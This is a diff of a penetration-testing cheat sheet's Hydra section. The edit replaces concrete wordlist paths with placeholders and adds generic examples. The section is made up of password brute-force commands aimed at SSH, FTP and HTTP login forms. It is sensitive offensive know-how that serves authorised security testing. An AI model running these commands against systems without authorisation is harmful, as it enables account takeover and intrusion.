@@ -263,17 +263,19 @@ $ export HYDRA_PROXY=connect://127.0.0.1:8080
 $ unset HYDRA_PROXY
 ```
 
-### Common Protocols
+### Common Commands
 
 ```c
-$ hydra <RHOST> -l <USERNAME> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<RHOST>
+$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
+$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
+$ hydra -C /PATH/TO/WORDLIST/<WORDLIST> <RHOST> ftp
 ```
 
 ### SSH
 
 ```c
 $ hydra -L usernames.txt -P passwords.txt <RHOST> ssh -V
-$ hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <RHOST> -t 4 ssh
+$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> -t 4 ssh
 ```
 
 ### FTP
@@ -315,15 +317,15 @@ $ hydra -L usernames.txt -P passwords.txt <RHOST> telnet -V
 ### HTTP
 
 ```c
-$ hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 ```
 
 ### Webform
 
 ```c
-$ hydra <RHOST> http-post-form -L /usr/share/wordlists/list "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /usr/share/wordlists/list
+$ hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
 $ hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+$ hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 
 ## John
